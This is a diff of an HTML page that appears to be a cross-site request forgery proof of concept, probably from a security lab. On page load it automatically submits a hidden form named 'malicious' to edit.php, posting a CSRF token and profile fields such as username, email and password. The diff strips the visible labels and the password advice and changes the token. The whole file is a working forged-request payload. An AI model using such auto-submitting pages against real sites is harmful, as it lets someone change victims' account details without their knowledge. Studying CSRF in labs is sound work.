@@ -1,26 +1,14 @@
 <html>
 <body onload="document.forms['malicious'].submit()">
 <form action="edit.php?id=1" method="post" name="malicious">
-    <input type="hidden" name="csrf_token" value="e4a1fc2231ecf2537b1d7a078a130673" />    First name:<br />
-    <input type="hidden" name="first_name" value="Honest" /><br />
-    Last name:<br />
-    <input type="hidden" name="last_name" value="Hacker" /><br />
-    Username:<br />
-    <input type="hidden" name="username" value="honest_hacker" /><br />
-    Email:<br />
-    <input type="hidden" name="email" value="test@test.com" /><br />
-    Previous password:<br />
-    <input type="hidden" name="previous_password" value="" /><br />
-    Password:<br />
-    <input type="hidden" name="password" value="" /><br />
-    Confirm Password:<br />
+    <input type="hidden" name="csrf_token" value="5b355431652392a5f9b9f0db69f64647" />
+    <input type="hidden" name="first_name" value="Honest" />
+    <input type="hidden" name="last_name" value="Hacker" />
+    <input type="hidden" name="username" value="honest_hacker" />
+    <input type="hidden" name="email" value="test@test.com" />
+    <input type="hidden" name="previous_password" value="" />
+    <input type="hidden" name="password" value="" />
     <input type="hidden" name="confirm_password" value="" /><br />
-    <p>
-      Passwords should be at least 12 characters and include at least one uppercase letter, lowercase letter, number, and symbol.
-    </p>
-    <p>
-      Strong password suggestion: r8mu12#8X44a    </p>
-    <br />
     <input type="hidden" name="submit" value="Update"  />
   </form>
 </body>
